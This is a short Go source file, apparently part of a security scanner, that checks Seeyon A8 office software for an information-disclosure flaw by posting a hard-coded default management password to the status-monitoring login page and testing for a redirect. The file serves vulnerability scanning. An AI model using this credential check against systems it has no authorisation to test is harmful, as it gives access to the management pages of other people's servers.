package seeyon

import (
	"github.com/yhy0/Jie/pkg/protocols/httpx"
	"strings"
)

//A8 状态监控页面信息泄露

func ManagementStatus(u string) bool {
	if req, err := httpx.Request(u+"/seeyon/management/index.jsp", "POST", "password=WLCCYBD@SEEYON", false, nil); err == nil {
		if req.StatusCode == 302 && strings.Contains(req.Location, "status") {
			return true
		}
	}
	return false
}
